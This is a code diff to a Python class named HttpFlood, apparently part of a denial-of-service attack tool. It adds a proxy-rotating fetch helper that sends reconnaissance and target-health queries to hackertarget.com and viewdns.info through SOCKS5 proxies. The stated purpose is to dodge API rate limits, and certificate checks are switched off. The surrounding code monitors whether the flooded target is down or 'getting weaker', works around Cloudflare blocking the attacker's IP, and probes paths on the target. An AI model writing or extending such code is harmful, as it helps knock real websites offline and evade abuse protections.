@@ -1829,6 +1829,38 @@ class HttpFlood(Thread):
         except: 
             intel["infra_map"]["xmlrpc_status"] = "UNKNOWN"
 
+    def _chaos_anti_limit_fetch(self, url, timeout=12):
+        """[V50] Built-in Automatic VPN / Anti-Limit.
+        Routes API queries (Hackertarget/ViewDNS) through our own Elite SOCKS5 proxies.
+        Guarantees unlimited checks without needing external VPN on Kali/Windows!
+        """
+        import requests, random, warnings
+        warnings.filterwarnings("ignore", message="Unverified HTTPS request")
+        try:
+            sample_size = min(10, len(self._proxies))
+            if sample_size > 0:
+                proxy_sample = random.sample(self._proxies, sample_size)
+                for pyx in proxy_sample:
+                    try:
+                        px_url = f"socks5h://{pyx.host}:{pyx.port}"
+                        resp = requests.get(
+                            url, 
+                            proxies={"http": px_url, "https": px_url}, 
+                            timeout=timeout,
+                            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/135.0'},
+                            verify=False
+                        )
+                        if resp.status_code == 200 and 'api count limit' not in resp.text.lower() and 'error' not in resp.text.lower()[:50]:
+                            return resp.text
+                    except:
+                        continue
+                        
+            # Fallback direct connection jika semua proxy tsb gagal
+            resp = requests.get(url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/135.0'})
+            return resp.text
+        except:
+            return ""
+
     def _chaos_response_timing_profiler(self):
         """[V46] External IP Health Monitor via hackertarget.com API.
         Checks target health from EXTERNAL servers every 5 minutes.
@@ -1844,18 +1876,15 @@ class HttpFlood(Thread):
         intel["_last_ext_check_time"] = time()
             
         try:
-            import urllib.request
             start = time()
             target_url = f"{self._target.scheme}://{self._target.authority}/"
             domain = self._target.authority.split(':')[0]
             api_url = f"https://api.hackertarget.com/httpheaders/?q={target_url}"
-            req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
             
-            with urllib.request.urlopen(req, timeout=12) as resp:
-                data = resp.read().decode('utf-8', errors='ignore')
+            data = self._chaos_anti_limit_fetch(api_url)
             elapsed_ms = int((time() - start) * 1000)
             
-            if 'HTTP/' in data and 'error' not in data.lower()[:50]:
+            if data and 'HTTP/' in data:
                 # Parse status code from first line (e.g. "HTTP/1.1 200 OK")
                 try:
                     status_code = int(data.strip().split('\n')[0].split(' ')[1])
@@ -1886,16 +1915,14 @@ class HttpFlood(Thread):
                 # [V49 2-Step Verification] Fallback to ViewDNS to confirm it's actually DOWN
                 try:
                     vd_url = f"https://viewdns.info/httpheaders/?domain={domain}"
-                    vd_req = urllib.request.Request(vd_url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/135.0'})
-                    with urllib.request.urlopen(vd_req, timeout=10) as vd_resp:
-                        vd_data = vd_resp.read().decode('utf-8', errors='ignore')
-                        if 'HTTP/' in vd_data and 'Moved Permanently' not in vd_data:
-                            # Target is actually UP, Hackertarget just glitched
-                            intel["ext_health_status"] = "HTTP OK"
-                            intel["target_is_down"] = False
-                            intel["target_getting_weaker"] = False
-                            intel["health_history"].append(500)
-                            return
+                    vd_data = self._chaos_anti_limit_fetch(vd_url, timeout=10)
+                    if vd_data and 'HTTP/' in vd_data and 'Moved Permanently' not in vd_data:
+                        # Target is actually UP, Hackertarget just glitched
+                        intel["ext_health_status"] = "HTTP OK"
+                        intel["target_is_down"] = False
+                        intel["target_getting_weaker"] = False
+                        intel["health_history"].append(500)
+                        return
                 except:
                     pass
                 
@@ -5947,14 +5974,11 @@ class HttpFlood(Thread):
         
         # --- PROBE 1: Main page fingerprint (via hackertarget.com API — 1 call only) ---
         try:
-            import urllib.request
             t_start = time()
             
             # [V46] Use hackertarget API for RECON — returns FULL HTTP headers from external IP
             api_url = f"https://api.hackertarget.com/httpheaders/?q={target_url}"
-            req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
-            with urllib.request.urlopen(req, timeout=15) as api_resp:
-                header_data = api_resp.read().decode('utf-8', errors='ignore')
+            header_data = self._chaos_anti_limit_fetch(api_url, timeout=15)
             
             intel["response_time_ms"] = max(int((time() - t_start) * 1000) - 500, 50)
             
@@ -6046,10 +6070,7 @@ class HttpFlood(Thread):
                 # Use hackertarget because our local machine IP is blocked by Cloudflare (returns 9999ms/timeout)
                 probe_url = f"{self._target.scheme}://{self._target.authority}{probe_path}"
                 api_url = f"https://api.hackertarget.com/httpheaders/?q={probe_url}"
-                import urllib.request
-                req2 = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
-                with urllib.request.urlopen(req2, timeout=6) as resp2:
-                    header_data2 = resp2.read().decode('utf-8', errors='ignore')
+                header_data2 = self._chaos_anti_limit_fetch(api_url, timeout=6)
                 
                 # If it's a 200, 401, or 403 (exists), it's considered discovered
                 if 'HTTP/' in header_data2 and 'error' not in header_data2.lower()[:50]:
